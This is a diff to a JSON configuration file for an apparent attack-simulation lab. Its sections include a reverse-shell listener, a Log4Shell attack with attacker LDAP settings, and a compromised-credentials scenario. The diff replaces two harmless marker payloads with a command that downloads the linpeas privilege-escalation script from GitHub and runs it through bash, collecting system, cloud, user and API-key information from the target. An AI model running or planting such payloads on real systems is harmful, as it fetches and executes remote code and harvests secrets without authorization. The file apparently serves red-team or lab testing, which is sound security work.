@@ -72,7 +72,7 @@
               "enabled": false,
               "listen_ip": "0.0.0.0",
               "listen_port": "4444",
-              "payload": "touch /tmp/pwned"
+              "payload": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | tee /tmp/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
             },
             "port_forward": {
               "enabled": false,
@@ -86,7 +86,7 @@
               "attacker_ldap_port": 1389,
               "# uncomment to use dns: attacker_ip": "attacker-public-1-attacker-${ deployment }.${ dynu_dns_domain }",
               "target_port": 8000,
-              "payload": "touch /tmp/log4shell_pwned"
+              "payload": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | tee /tmp/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex"
             },
             "docker_composite_compromised_credentials_attack": {
               "enabled": false,
